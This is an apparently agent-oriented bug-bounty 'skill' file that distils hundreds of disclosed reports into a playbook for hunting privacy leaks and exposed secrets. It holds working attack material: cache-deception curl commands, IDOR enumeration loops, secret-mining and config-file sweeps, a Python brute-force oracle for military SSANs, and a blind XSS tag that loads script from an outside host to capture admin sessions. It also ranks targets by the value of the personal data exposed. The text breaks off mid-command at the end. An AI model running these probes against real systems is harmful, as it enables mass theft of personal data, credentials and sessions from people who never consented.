---
name: hunt-privacy
description: Hunting skill for privacy violations and sensitive-data exposure (PII/PHI/CUI/SSN/CAC-ID leakage, secrets and API keys in JS/GitHub, web-cache deception, IDOR at scale, misconfigured record permissions, exposed debug/metrics/status endpoints, cleartext logs, privacy-setting regressions, third-party/partner API overexposure). Built from 367 assigned reports of which 290 full disclosed-report texts were mined verbatim — including Expedia/Abritel cache-deception to session-token theft, Shopify WCD to CSRF-token leak, Stripo/AWS/Rockset/AppLovin/GlassWire/Omise API-key leaks, DoD military-orders and tour-visitor PII leaks, Salesforce Aura sequential-IDOR at scale, WordPress wp-json user enumeration, Zomato deeplink disclosure, Curve waitlist phone-number leak, and Twitter protected-tweets bypass. Use when hunting any target that stores user/employee/customer data, secrets, or tokens — prioritize unauthorized-data proof and record-count quantification before submission.
sources: hackerone_public, disclosed_reports, github_public_search, google_dorking, wayback_machine, public_writeups
report_count: 367
full_reports_read: 290
---

# HUNT-PRIVACY — Privacy Violations & Sensitive-Data Exposure

> Grounded in 290 full disclosed-report texts (of 367 assigned).
> Every technique, probe, and citation below maps to a real report ID in the study pack.
> The mining frequency table is reproduced verbatim so you can rank your effort by what
> researchers actually find, not by what textbooks say.

---

## Crown Jewel Targets

Privacy findings are highest-value when they expose **data that belongs to someone other
than the attacker**, at **scale**, with **no authentication or with a trivially obtained
low-privilege account**. Rank your targets accordingly.

### Highest-value data classes (from the reports)

- **Government / military PII & CUI** — SSN, full name, home address, date of birth, phone,
  DODID number, CAC User ID, security-clearance level, MOS/schools/specialty training,
  supervisor, and "Controlled Unclassified Information" (reports #2926447, #2967032,
  #1556950, #900137). These dominate the Critical tier because breach notification and
  Privacy Act exposure are automatic. Report #2926447 exposed a single service member's
  full name, SSN, home address, marital status with dependents, and clearance level through
  a public Google Drive link embedded in an orders page.

- **PHI (protected health information)** — shot records and medical/vaccination PDFs
  viewable by a non-medical user (#1085782). The reporter, an Active Duty Airman, found a
  sponsor function that rendered another person's shot records in PDF form.

- **Session / auth tokens** — `HASESSIONV3`, `ha.crumb`, JWT, `access_token`, CSRF tokens
  leaked through cached pages or misconfigured APIs (#1698316, #1271944, #1072893,
  #2129769). These convert a "read-only" privacy leak into full account takeover.
  #1698316 extracted a live session cookie and its crumb from a cached profile page;
  #1072893 leaked the parent user's JWT to a low-privilege shared-access account.

- **Password hashes & plaintext passwords** — an admin `api/users` endpoint returning
  every user's hash (#1489892), `.orig` backups with DB credentials (#1626236), passwords
  in JSON responses and memory dumps (#215083), and MD5 passwords decrypted easily
  (#1703733). #1626236 used `view-source:` on `database.php.orig` to read the database
  host, name, username, and password in cleartext.

- **Cloud & third-party secrets** — AWS access/secret keys in a public GitHub repo
  (#3017105), an AppLovin SDK key hardcoded in a repo (#674774), a Facebook App secret in
  an APK verified against the Graph API (#1641475), a Rockset key visible only in an old
  commit (#1094151), Stripo Aviary/YouTube keys in a JS bundle AND again unredacted in the
  disclosed report (#983331, #1047125), Firebase configs (#1447751), and
  `ZRT_API_KEY`/`JWT_SECRET` in a public repo found by searching subdomains (#1298809).

- **Contact & waitlist databases at scale** — every joined user's mobile number and
  address from one unauthenticated endpoint (#902733); "hundreds of thousands" of tour
  visitors' names, emails, and phones from misconfigured Salesforce object permissions
  (#2294930); and 1000+ enumerated endpoints with CSV PII (#1172852). #902733 found that
  entering any victim email into the waitlist "Track my Position" feature returned that
  person's full mobile number and address details.

### Highest-value system types (from the reports)

- **Self-service / HR / personnel portals** — `SelfService`, `JOINOnline`, and
  `/s/sfsites/aura` Salesforce Aura portals where sequential record IDs expose other
  users (#1556950, #2586641, #2586584, #2968391, #1624374). #1556950 walked a
  `dynamicdata/section/.../124948002` URL and grepped for `Primary MOS`.

- **E-commerce checkout & order APIs** — `checkout_ari`, order/document download IDs, and
  Shopify customer-id traversal (#1323406, #1626508, #975047). Swapping `checkout_ari`
  returned another customer's full address, payment means, and products (#1323406).

- **Caching reverse proxies in front of authenticated pages** — web-cache deception via
  path confusion plus `.css`/`.jpeg` extensions (#1698316, #1271944).

- **Admin panels & monitoring stacks** — `wp-json/wp/v2/users`, Grafana `/metrics`, Splunk
  `__raw/services/server/info`, `/server-status/`, SAP `/sap/public/info`, and open S3
  buckets (#2450685, #1448218, #1860905, #1632104). #1448218 found internal IP and OS
  details at `/sap/public/info` and an open AWS bucket listing.

- **Mobile apps & deep links** — `exported="true"` deeplink routers, hardcoded API keys in
  APKs, and "Protect your Tweets" being unset on email change (#532225, #753868, #472013).

- **Partner / third-party APIs** — `niche.co`, the Streamlabs platform API, and third-party
  image-request tracking via cookies (#273698, #1072893, #329957).

**Payouts are highest** when the finding chains: cached token to session hijack to ATO
(#1698316), or one sequential ID to tens of thousands of PII records to clearance/CUI
exposure (#2967032). Data-class alone matters; the product of data-class × scale ×
lack-of-authorization is what drives severity.

---

## Attack Surface Signals

### URL / endpoint patterns to hunt

```
/traveler/profile/edit                   (session + crumb in cacheable page)
/search/keywords:.../x.jpeg?triagethis   (path-confusion cache deception)
/wp-json/wp/v2/users/<id>                (WordPress author enumeration)
/api/v1/users/<id>  /api/v1/users/current
/api/waitlist/us                         (single endpoint dumps all users)
/api/users?page=1&userId=&firstName=..   (password hashes in response)
/members/invite/                         (GET/POST manipulated for PII)
/Download.aspx?id=<id>                   (attachment/document IDOR)
/PKI/PassReset.aspx  /PassReset1.aspx    (no rate limit -> PII brute force)
/SelfService/Home/dynamicdata/section/...
/JOINOnline/UpdateProfile/<user-id>
/JOINOnline/Board/QuestionCard/<user-id>/...
/s/sfsites/aura?r=..                     (Salesforce Aura controller enumeration)
/app/org/{id}/profile/{id}/version/{id}
/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json
/metrics   /server-status/   /sap/public/info
/api/sp/customer/id                      (Shopify WeChat customer traversal)
/OA_HTML/ibeCAcpSSOReg.jsp               (self-register -> user list)
/config   /.git/config   /database.php.orig
/public/.../*.pdf   /.../*.pptx   /.../*.csv
```

### Parameter / object-reference patterns

```
?id=          ?userId=      ?user-id=     ?saarnId=     ?VendorId=
?email=       ?id (numeric sequential)    checkout_ari   @username
?version=     ?profile=     ?order=       ?contract=    ?Mode=ReadOnly&Id=
challenge_answer / challenge (MD5 of timestamp — predictable)
```

### JS / bundle patterns (client-side code)

```javascript
apiKey: "..."              api_key = "..."          aviaryApiKey: "..."
youtubeApiKey: "..."       firebase config apiKey + databaseURL
process.env.* (NEXT_PUBLIC_ vs server-only)
"Authorization: %s" %s = self.api_key      // secret logged in cleartext
main.<hash>.js                             // parse for hardcoded secrets
challenge = md5(timestamp)                 // reset-token guessability
```

### Response / header signals

```
Set-Cookie + X-Cache / Age headers on a page that should be private
Cached response returns a DIFFERENT user's data on a second fetch
Access-Control-Allow-Origin: * (or reflected) on PII endpoints
GraphQL response contains fields not present in the UI
API response includes email/jwt/password_hash/password fields
Server headers revealing Splunk/Grafana/SAP/AEM/CRXDE Lite
```

### Tech-stack signals

- **Salesforce Aura / Experience Cloud** — `/s/sfsites/aura` plus `aura.token`, sequential
  18-digit record IDs, and a `GetRecord` controller (#2294930, #2968391).
- **WordPress** — `wp-json/wp/v2/users/<id>` exposing authors and their data (#2450685).
- **Next.js / webpack bundles** — content-hashed JS and source maps with secrets (#983331).
- **AEM / CRXDE Lite** — an unauthenticated authoring console leading to config disclosure
  (#1095830).
- **ASP.NET WebForms** — `__EVENTTARGET`, `__VIEWSTATE`, and `PassReset.aspx` flows
  (#2748003).
- **Grafana / Splunk / SAP / AEM** — monitoring and admin surfaces leaking internal IPs,
  OS details, and license keys (#1448218, #1860905).
- **Android `/exported` activities** — deeplink routers accepting `url` query params
  (#532225).
- **GitHub public repos** — company subdomains, SDK keys, and tokens in current code AND in
  old commits / PR diffs (#1094151, #1298809, #396467).

### Sensitive-data type signals (what a leak "looks like")

```
SSN | SSAN | "XXX-XX-XXXX" | CAC User ID | DODID | clearance level
full name | home address | phone | email | DoB | marital status | dependents
MOS | schools | specialty training | supervisor | pay voucher | drill attendance
jwt | access_token | HASESSIONV3 | ha.crumb | csrf token | password hash
apiKey | api_key | client_secret | AWS_ACCESS_KEY | APP_KEY | JWT_SECRET
```

---

## Discovery Patterns From 290 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

Ranked by how often the surface produced a real finding in the 290 reports:

1. **JS files & source maps from the live site** — *what to look for*: download every
   `main.<hash>.js` and chunk, then parse for `apiKey`, `api_key`, `secret`, `token`,
   `aviaryApiKey`, and `youtubeApiKey`. Report #983331 was found while "surfing on the
   stripo website… authentication key written in public accessible javascript file"; #902733
   found `/usa` by "going through all the JS files in curve.com".

2. **Public GitHub / code search for company subdomains & secrets** — *what to look for*:
   search repo code, commit history, and PR diffs for `ZRT_API_KEY`, `JWT_SECRET`, AWS keys,
   private RSA keys, Weblate secret keys, and Firebase configs. #3017105 found AWS keys in a
   public repo; #1094151 found a key visible only in an old commit; #674774 found an
   AppLovin key hardcoded in `AndroidManifest.xml`; #1298809 found credentials by searching
   for company subdomains.

3. **Authenticated request replay with a swapped identifier (IDOR)** — *what to look for*:
   capture a self-request to a profile/order/profile-version endpoint, change the numeric ID
   to a neighbor, and check whether another user's data returns. #2586584 changed a numeric
   `user-id`, #1323406 swapped `checkout_ari`, and #975047 simply "Modify[d] the ID value to
   traverse the user information".

4. **Caching behavior on authenticated pages** — *what to look for*: append `.css`, `.jpeg`,
   `/x.css`, or a random filename to a private URL, fetch as the victim, then fetch
   unauthenticated. #1698316 used
   `/search/keywords:soissons-france/minNightlyPrice/x.jpeg?triagethis`; #1271944 used
   "path confusion followed by a random file name and `.css`".

5. **Google dorking / Wayback for cached docs & files** — *what to look for*: `site:` queries
   for contract IDs, order IDs, PDFs, PPTX, and CSV. #374007 "discovered through google
   search query that I was able to access several Order/contract id's"; #644358 found a PDF
   on service members; #1514356 used "yahoo dorking techniques"; #719631 found presentation
   slides with `XXX-XX` masked SSNs.

6. **Admin / monitoring / debug endpoints from scans** — *what to look for*:
   `/server-status/`, `/metrics`, `/sap/public/info`, the Splunk raw endpoint, and open S3
   bucket listing. #1632104 said "server status directory on your system is open"; #1448218
   found endpoints "while running through scan".

7. **Backup & misconfig files (`view-source:`)** — *what to look for*: `.orig`, `.git/config`,
   `database.php.orig`, `/config`, and `.env`. #1626236 used
   `view-source:.../database.php.orig` to read DB user/password/name, #3612891 exposed
   `.git/config`, and #1018413 found `/config` development config disclosure.

8. **Subdomain enumeration** — *what to look for*: crawl `app.`, `staging.`, `dash.`,
   `mtn.ug`, and scan for forgotten hosts. #895650 "started with the `app` subdomain";
   #1447751 found a Firebase config in a subdomain's source; #684836 found LFD on a scanned
   subdomain.

9. **API/schema discovery (GraphQL, Swagger, wp-json)** — *what to look for*: new or
   unreferenced fields, `team_profile`, `wp/v2/users`, and undocumented admin routes.
   #389600 "noticed there is new field `team_profile` added"; #2450685 used
   `wp-json/wp/v2/users/15`.

10. **Registration / invitation / shared-access flows** — *what to look for*: self-register,
    invite a low-privilege user, then call privileged endpoints. #1624374 "register… and get
    the list of users"; #1072893 used a Moderator-shared account to reach
    `/api/v1/s/user/me` and obtain the parent's email and JWT; #787955 manipulated
    `/members/invite/`.

11. **Mobile app decompilation & deeplink routers** — *what to look for*: `exported="true"`
    activities, `url` query params, and hardcoded SDK keys. #532225's
    `com.application.zomato.activities.DeepLinkRouter` was exported; #753868 said
    "Decompile the app… look for sensitive information"; #1641475 found a secret in
    `GlassWire.exe`.

12. **Disclosed reports & hackerone hacktivity as input** — *what to look for*: un-redacted
    keys in disclosed reports, links posted by team members, reused report IDs.
    #1047125 found Stripo's keys unblurred in the public disclosure of #983331 and still
    usable; #1256371 found a link in a disclosed H1 report; #979787 found an internal
    tracking link from a GitLab member; #520842 rechecked report #235041.

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

Frequencies are the number of full reports containing each signal (verbatim from the study
pack's frequency table). Use them to prioritize: a high count means many researchers found
data there.

| Rank | Signal / tag | # reports | Why it matters (privacy lens) | What to probe |
|------|-------------|-----------|-------------------------------|---------------|
| 1 | image-processing | 102 | Image/avatar/pipeline endpoints often wrap user-controlled URLs or expose PII in login/registration flows | Probe avatar/preview fetch params; check `/pages/login.aspx` style pages for mass PII (#900137) |
| 2 | search-filter-sort | 97 | Search/filter forms echo IDs and expose hidden fields; the Expedia WCD payload hid in a `/search/keywords:` path | Append cache-buster extensions to search URLs; fuzz filter params for IDOR |
| 3 | api-endpoint | 87 | The single richest source: waitlist, users, customers, invites, orders | Enumerate every API route in JS; swap IDs; check for password/email/jwt in responses (#902733, #1489892, #975047) |
| 4 | server-side-rendering | 79 | SSR pages reflect cached user data and secrets; templates render PII | Test cache headers, template variables, and path confusion on SSR routes (#1698316) |
| 5 | public-code-search | 75 | Secrets in public GitHub are a top Critical source | Trufflehog/grep repos and commit history for company keys (#3017105, #1094151, #674774) |
| 6 | admin-internal | 52 | Admin panels over-expose users and PII to low-privilege roles | Access admin endpoints with a Moderator/shared account (#1072893, #2450685) |
| 7 | misconfiguration | 51 | Open storage, permissions, and status pages | Check bucket listing, `/server-status/`, Salesforce object perms (#1448218, #2294930, #1632104) |
| 8 | comment-injection | 39 | Comment/contact forms are XSS/blind-XSS vectors that exfil session tokens and PII | Submit blind XSS payloads to contact forms; watch XSShunter/collaborator (#878145) |
| 9 | session-attack | 34 | Token theft leads to ATO; privacy-setting state is tied to session | Steal tokens via cache/XSS; test email-change flows resetting privacy (#472013) |
| 10 | cookie-handling | 32 | Cookies enable cross-site user tracking and identify victims | Test third-party image requests with auth cookies (#329957) |
| 11 | xml-parser | 31 | XML/Aura/SAML flows carry object references and tokens | Manipulate Aura POST bodies and XML IDs to enumerate records (#2294930, #2968391) |
| 12 | cache-layer | 31 | Web-cache deception stores private pages publicly | Path confusion plus `.css`/`.jpeg` to poison shared cache (#1698316, #1271944) |
| 13 | redirect-handling | 28 | Redirects bypass privacy checks and leak tokens in URLs | Follow redirects with proxy-auth; check token in `Location`/history (#1086259) |
| 14 | filter-bypass | 27 | WAF/filters miss encoded object refs and secret paths | Encode IDs, try `.orig`/backup extensions, use IDN for privacy bypasses |
| 15 | js-source-review | 25 | JS bundles hardcode secrets and reveal hidden endpoints | Parse bundles for keys, internal hosts, admin route names (#983331, #1489470) |
| 16 | internal-network | 25 | Internal hostnames/IPs leak via info pages; SSRF to metadata | Probe `/sap/public/info`, SSRF Host header tricks (#310036, #1448218) |
| 17 | sso-oauth | 22 | OAuth/SSO flows over-share tokens and protected data | Call partner APIs directly to bypass privacy settings (#273698), test SSO registration (#1624374) |
| 18 | stored | 21 | Stored payloads and stored secrets persist for admins/other users | Blind XSS in contact form; check credential managers (#878145, #1874155) |
| 19 | url-fetching | 20 | URL-fetch endpoints expose docs/PII by ID | Enumerate document download IDs (#1626508) |
| 20 | idor-object-ref | 20 | Direct object refs to others' PII | Swap sequential IDs on profiles/orders/documents (#2586584, #1323406) |
| 21 | subdomain-takeover | 17 | Forgotten subdomains host secrets or stale apps | Recon all subdomains for PII files and exposed configs (#895650) |
| 22 | proxy-feature | 16 | Proxies/partner apps surface data outside the main privacy boundary | View protected tweets via `niche.co` (#273698); shot records via proxy (#1085782) |
| 23 | brute-otp-reset | 15 | No rate limit enables PII enumeration via reset flows | Brute-force SSANs in password reset (#2748003), test throttle annotations (#1596918) |
| 24 | subdomain | 13 | New subdomains leak PII files | Crawl discovered hosts for CSV/PDF/config (#1447751, #1483201) |
| 25 | debug-error-leak | 13 | Debug endpoints/logic reveal secrets | Check logging of `Authorization` header (#1662194), error pages |
| 26 | csrf | 13 | Sensitive actions/data via GET are cacheable and leaky | GET-based unlink with token in URL (#163820); CSRF token in cached page (#1271944) |
| 27 | json-body | 12 | JSON responses carry hashes/PII | Inspect `api/users`/waitlist JSON bodies for sensitive fields (#1489892, #2524562) |
| 28 | cors-misconfig | 12 | Permissive CORS lets origins read PII cross-site | Test `Origin` reflection on PII endpoints (#1072893) |
| 29 | cloud-metadata | 12 | SSRF/instance metadata leaks internal IPs and data | Test Host header `@` trick to collaborator (#310036) |
| 30 | import-feature | 11 | Import/parse features read attacker-influenced files | Malicious netrc file read (#3211126) |
| 31 | export-feature | 10 | Exports dump all users' data | Look for CSV/user-list export endpoints (#228399) |
| 32 | recon | 10 | Recon is how most of these were found | Subdomain plus JS plus GitHub recon first |
| 33 | dos-resource | 9 | Large JS/DoS side-effects can expose secrets | Note resource hints (#983331) |
| 34 | blind-oob | 9 | Blind XSS/collaborator confirms backend admin exposure | Blind XSS to admin panel (#878145) |
| 35 | template-engine | 8 | Templates reference secrets | Parse template config for keys (#983331) |
| 36 | stack-fingerprinting | 8 | Fingerprinting identifies vulnerable versions | Version-banner the stack (Splunk CVE #1860905) |
| 37 | base64-encoding | 7 | Encoded secrets/tokens hide in configs | Decode long base64 strings in bundles |
| 38 | template-injection | 7 | Injected templates render PII | Test template fields |
| 39 | fuzzing-enumeration | 6 | Fuzzing finds sensitive dirs/files | Directory fuzz for `/usa`, `/config`, CSVs (#983331, #1018413) |
| 40 | open-redirect | 6 | Redirects leak tokens/enable tracking | Test redirect params for token exfil |
| 41 | auth-bypass | 5 | Weak authz exposes PII | AEM CRXDE unauthenticated (#1095830) |
| 42 | csv-parser | 5 | CSV files leak user data | Search for exposed CSVs with PII (#1172852) |
| 43 | path-traversal-lfi | 5 | Local file disclosure of secrets/configs | LFD on scanned host (#684836) |
| 44 | dependency-confusion | 5 | Public packages carry secrets | Check published packages |
| 45 | graphql | 4 | New GraphQL fields expose hidden data | Introspect `team_profile` (#389600) |
| 46 | dom-based | 4 | Client-side privacy handling leaks data | Inspect DOM for hidden user content (#505424) |
| 47 | link-preview | 4 | Preview fetchers leak internal/private data | Probe preview URLs |
| 48 | unicode-normalization | 4 | IDN/trailing-dot bypass privacy controls | IDN HSTS bypass (#1753226, #1813831) |
| 49 | file-upload | 4 | Uploaded files expose PII | Check uploaded docs/PDFs/PPTX (#1512199) |
| 50 | wayback-machine | 3 | Archived pages retain leaked data | Wayback for removed PII pages (#1860905) |
| 51 | google-dorking | 3 | Dorks surface cached PII | `site:` query for contract/military IDs (#374007, #1514356) |
| 52 | jwt-token | 2 | JWTs leak via shared-access APIs | Decode/check JWT in API response (#1072893) |
| 53 | request-smuggling | 2 | Smuggling bypasses privacy controls | Test desync on cache/proxy |
| 54 | port-scanning | 2 | Open ports expose internal services | Scan for LFD/internal hosts (#684836) |
| 55 | case-variation | 2 | Case tricks bypass filters | Vary case on secret paths |
| 56 | host-header | 1 | Host header abuse leaks internal IP | `@` in Host to collaborator (#310036) |
| 57 | nosql-mass-assignment | 1 | Mass assignment exposes fields | Assign hidden PII fields |
| 58 | websocket | 1 | WS streams leak data | Inspect WS frames |
| 59 | command-injection | 1 | Command exec leads to file read | RCE to read secrets |
| 60 | svg-upload | 1 | SVG upload leads to stored XSS | Upload malicious SVG |

### Verbatim Discovery Clues (18 real `[#id]` quotes)

These are exact "how I found it" lines from disclosed reports. They show the *mental move*
that surfaced the bug — replicate the move, not the target.

1. `[#983331]` "I found a sensitive data including authentication key written in public accessible javascript file."
2. `[#902733]` "I found a link called "/usa" is used to create Curve USA Waitlists by entering your name, email address, mobile number and address details."
3. `[#1626508]` "I have found this API endpoint leads to leaking attachments and documents of users."
4. `[#2586584]` "Through research, I discovered a vulnerability in DoD, that exposes other users' email addresses through IDOR."
5. `[#389600]` "I noticed there is new field `team_profile` added and using the graphql below the latest serious report and reports received in three months were exposed"
6. `[#787955]` "I found PII Disclosue at https://connect."
7. `[#753868]` "I found a bunch of API keys,Tokens."
8. `[#1271944]` "I discovered that by applying path confusion followed by a random file name and `."
9. `[#2586641]` "Through researching on the DoD, I discovered an IDOR Vulnerability that allows a malicious user to access other user's demographic details."
10. `[#1085782]` "When browsing the ██████ website with a proxy I noticed that there is a function that allows sponsors (in this case me) to view their █████s shot records in PDF form."
11. `[#2967032]` "While using the system as intended (submitting a SAAR), I noticed there is an insure direct object Reference vulnerability in the application."
12. `[#1632104]` "I found that the server status directory on your system is open, it displays server status and sensitive information by server"
13. `[#273698]` "but i found a way to view the protected tweets from other user who protect their tweets."
14. `[#674774]` "I found a Sensitive Data Exposure in github/mopub-android-mediation project, the AppLovin UI API key is hardcoded in source code."
15. `[#878145]` "I was able to submit a blind xss payload through the form which was triggered in backend /admin panel."
16. `[#1094151]` "In this case I found a Rockset API key, This API key is not in the current code, but it is visible in an old commit."
17. `[#1172852]` "Using it I have enumerated almost 1000 unique endpoints and on some of them I found csv files with PII of users (Name,Email,Phone,Role,Organisation"
18. `[#1489892]` "During my primary research I found that `api/users?"

### Probe Checklist (15 concrete probes)

Run these one at a time; log each result even when it returns only your own data — that is
your negative control.

- [ ] **1. Cache-deception extension probe** — authenticated GET to a private path, then the
  same path plus `/x.css`, `/.jpeg`, `/random.css`; fetch unauthenticated and diff. Targets
  #1698316, #1271944.
- [ ] **2. Numeric ID walk** — capture your own profile GET, add `add` variable to the numeric
  `user-id` in Intruder, step +/-10, grep for another email/name. Targets #2586584, #2586641.
- [ ] **3. Transaction-reference swap** — replace `checkout_ari` / `order_id` / `saarnId`
  with a neighbor's value; confirm full address/payment/PII returns. Targets #1323406,
  #2967032.
- [ ] **4. Document-download IDOR** — GET `/Download.aspx?id=4675`, increment `id`, collect
  files. Target #1626508.
- [ ] **5. GraphQL field probe** — introspect for newly added fields (`team_profile`,
  `reports`, `structured_scopes`); query them for hidden data. Target #389600.
- [ ] **6. Salesforce Aura enumeration** — capture `/s/sfsites/aura` POST with `aura.token`,
  replay `GetRecord` with sequential 18-digit IDs, grep for PII fields. Targets #2294930,
  #2968391.
- [ ] **7. WordPress author enumeration** — GET `/wp-json/wp/v2/users/15` (and 1..50); check
  for emails/usernames. Target #2450685.
- [ ] **8. Mobile privacy-setting regression** — change/verify email on the mobile client and
  re-check "Protect your Tweets" / private-account flags. Target #472013.
- [ ] **9. Deeplink exported-activity probe** — launch `zomatodelivery://...?url=...` from
  another app / ADB; check whether the WebView loads the attacker URL. Target #532225.
- [ ] **10. Password-reset brute** — script ASP.NET postback to `PassReset.aspx` with SSAN
  candidates; watch for a "valid" vs "invalid" oracle. Target #2748003.
- [ ] **11. Monitoring/status sweep** — request `/server-status/`, `/metrics`,
  `/sap/public/info`, the Splunk raw endpoint, and bucket listing. Targets #1632104,
  #1448218, #1860905.
- [ ] **12. JS secret grep** — download all JS bundles,
  `grep -oE '(apiKey|api_key|secret|token|password)["']?\s*[:=]'`, decode base64 blobs.
  Target #983331.
- [ ] **13. GitHub history search** — search company subdomains plus `API_KEY`/`SECRET`;
  inspect OLD commits and PR diffs, not just HEAD. Targets #1094151, #3017105, #1298809.
- [ ] **14. Backup & config file fetch** — `view-source:` `.orig`, `.git/config`,
  `database.php`, `/config`, `.env`. Targets #1626236, #3612891, #1018413.
- [ ] **15. Low-privilege API boundary test** — register/invite a Moderator, call
  `/api/v1/s/user/me` and other privileged endpoints; check for parent email/JWT. Targets
  #1072893, #1624374, #787955.

---

## Step-by-Step Hunting Methodology

1. **Start with passive recon before touching a single parameter.** Enumerate subdomains,
   pull the homepage JS bundles, and run GitHub/dork searches. In the corpus, the first move
   was almost never a direct exploit — it was "going through all the JS files" (#902733),
   "surfing on the website" (#983331), "searching in github repos for sub-domains" (#1298809),
   or "google search query" (#374007). Record every discovered endpoint, key, and document
   link.

2. **Build a target inventory of three lists:**
   - **Data stores** — APIs, profiles, download handlers, exports, waitlists, admin panels.
   - **Secrets locations** — JS bundles, public repos, APKs, config/backup files, and
     disclosed reports (yours and others').
   - **Caching/monitoring surfaces** — any reverse proxy, `/metrics`, `/server-status/`,
     Splunk/Grafana/SAP paths.

3. **Check secrets first (fastest Critical).** Parse bundles and repos for keys. For each
   candidate key, verify it is live against its provider's API — #1641475 confirmed the
   Facebook secret with a `graph.facebook.com/oauth/access_token` call; #1094151 confirmed
   the Rockset key with `curl .../apikeys`; #1047125 re-tested Stripo's key from a disclosed
   report and found it still worked. Test OLD commits and disclosed reports, not only current
   code.

4. **Map object references.** For every endpoint that returns *your* data, identify the
   identifier: numeric ID, `checkout_ari`, `saarnId`, `VendorId`, `user-id`, `id`,
   `@username`, or `contract id`. Ask: "what happens if I change it to the neighbor value?"
   Two accounts are ideal — #2586641 used user-id 1328 and 1327.

5. **Run the IDOR swap systematically.** Send your own request, note the fields returned
   (email, address, phone, PII), then iterate IDs with Intruder and grep-exact on a distinctive
   PII marker. #1556950 grepped for `Primary MOS` while fuzzing 1..9; #2294930 noted
   "Salesforce Id's are sequential and can be easily enumerated via the GetRecord Aura
   controller."

6. **Test the caching layer on authenticated routes.** Log in as victim, request a private
   page with a cache-confusing extension, then fetch the poisoned URL as an unauthenticated
   second user. Look for `Set-Cookie`/`X-Cache`/`Age` headers and cross-user data. #1698316
   extracted `HASESSIONV3` and `ha.crumb`; #1271944 leaked personal info and CSRF tokens with
   path confusion plus `.css`.

7. **Probe the privilege boundary.** Register a fresh account or invite a low-privilege/shared
   user, then access admin/other-user endpoints. #1072893 used a Moderator-shared account to
   reach `/api/v1/s/user/me` and obtain the parent's email and JWT; #1624374 self-registered
   and retrieved the full user list.

8. **Test rate limits and predictable tokens.** For password-reset / OTP / invite flows,
   script repeated attempts and look for a response oracle or missing throttling. #2748003
   brute-forced SSANs in `PassReset.aspx`; #1596918 found `@BruteForceProtection` methods
   that never call `throttle()`; #895650 reversed a `challenge` that was just the MD5 of a
   timestamp.

9. **Hunt misconfigured storage and files.** Google-dork for PDFs, PPTX, CSV, and
   `Mode=ReadOnly&Id=` links. #2926447 found a public Google Drive link embedded in a page
   exposing military orders with SSN; #644358 found a PDF of service members; #1512199 found
   credentials in a PPTX; #2926447, #719631, and #665144 all came from exposed presentation
   slides.

10. **Test privacy-setting integrity.** For social/mobile apps, exercise flows that toggle
    privacy (email change, profile edit, third-party connect, unlink) and re-verify the
    setting afterward. #472013: verifying a new email unset "Protect your Tweets";
    #273698: connecting Twitter to `niche.co` allowed reading protected tweets through the
    partner API; #708696: a privacy setting failed to hide a target account.

11. **Check debug / monitoring / error surfaces.** Sweep `/server-status/`, Grafana metrics,
    Splunk raw, AEM CRXDE Lite, `/config`, `.git/config`, and `.orig` backups. #1632104,
    #1448218, #1860905, #1095830, #1018413, #1626236, and #3612891 all came from such
    surfaces.

12. **Consider blind XSS for admin-only PII.** If a contact/feedback form feeds an admin
    panel, submit a blind XSS payload and wait for the collaborator hit to capture session
    tokens/PII from the admin context. #878145 leaked Mailchimp info and session tokens via a
    contact form.

13. **Quantify scale before reporting.** Once you have one unauthorized record, enumerate how
    many are exposed — sequential IDs, "2000 records per request" (#2294930), "tens of
    thousands" (#2967032), or "1000 unique endpoints" (#1172852). Scale is what moves a Medium
    to Critical.

14. **Verify the data is real, not test data.** #374007 googled a leaked email and found the
    owner's LinkedIn to confirm live data. Record this verification in the report.

15. **Document the full chain with screenshots** of each hop: recon source to unauthorized
    request to response showing another user's PII/token to proof it belongs to someone else
    to count of records.

---

## Payload & Detection Patterns

### Web-cache deception (path confusion)

```bash
# Victim-authenticated request, then fetch the poisoned URL unauthenticated
curl -s -b 'Cookie: SESSION=<victim>' \
  'https://target.com/traveler/profile/edit/x.css' -D -
curl -s 'https://target.com/traveler/profile/edit/x.css' \
  | grep -iE 'HASESSION|ha.crumb|csrf|token|@'

# Common poison suffixes
/x.css        /.css          /random.js       /a.jpeg
/x.jpeg?triagethis            /style.css       /;x.css
/..%2fx.css                   /x.css?cb=123
```

### IDOR enumeration (Intruder-style loop)

```bash
# Simple sequential walker; grep for a PII marker unique to other users
for id in $(seq 1320 1340); do
  body=$(curl -s -b "Cookie: $COOKIE" "https://target.com/api/v1/users/$id")
  echo "$body" | grep -qiE 'email|@' && echo "HIT $id: $(echo "$body" | head -c 200)"
done

# Salesforce Aura: replay captured POST, swap 18-digit record id
curl -s -X POST 'https://target.com/s/sfsites/aura?r=19' \
  -H 'Content-Type: application/json' \
  -d '{"aura.token":"<token>","recordId":"<18-digit-id>"}'
```

### Secret mining in JS / GitHub

```bash
# Pull all JS bundle URLs from the live page and grep for secrets
curl -s https://target.com/ \
  | grep -oE 'src="[^"]*\.js"' | sed 's/src=//;s/"//g' | while read u; do
  curl -s "https://target.com$u" \
    | grep -oE '(apiKey|api_key|secret|token|password|aviaryApiKey|youtubeApiKey)["'"'"']?\s*[:=]\s*["'"'"'][^"'"'"']+'
done

# Decode base64 blobs that may hide keys
grep -oE '[A-Za-z0-9+/]{30,}={0,2}' bundle.js \
  | while read b; do echo "$b" | base64 -d 2>/dev/null | grep -iE 'key|secret|token'; done

# GitHub: search current code AND history/PR diffs
#   "target.com" API_KEY ; "ZRT_API_KEY" ; org secret ; private key
git log --all -p | grep -iE 'api[_-]?key|secret|token|password'
```

### Config / backup file disclosure

```bash
for p in /.git/config /database.php.orig /config /.env /info.php \
         /en-US/splunkd/__raw/services/server/info/server-info?output_mode=json \
         /server-status/ /metrics /sap/public/info; do
  code=$(curl -s -o /tmp/p -w '%{http_code}' "https://target.com$p")
  [ "$code" = 200 ] && { echo "[+] $p"; head -5 /tmp/p; }
done
```

### GraphQL hidden-field probe

```graphql
query { query { team(handle:"security") {
  structured_scopes(first:10) { edges { node { asset_identifier
    reports { total_count } } } }
} } }
```

### Rate-limit / reset oracle

```python
import requests
for ssan in candidate_ssans:
    r = requests.post(url + "/PKI/PassReset.aspx", data=payload, verify=False)
    if "valid" in r.text.lower() or len(r.text) != BASELINE:
        print("VALID_ORACLE", ssan)
```

### Blind XSS for admin-context PII

```
"><script src=https://YOUR.xss.ht></script>
```

Submit to every contact/feedback/name field; wait for the collaborator callback carrying
admin-session data (#878145).

### ffuf parameter/endpoint discovery

```bash
ffuf -w seclists/Discovery/Web-Content/burp-parameter-names.txt \
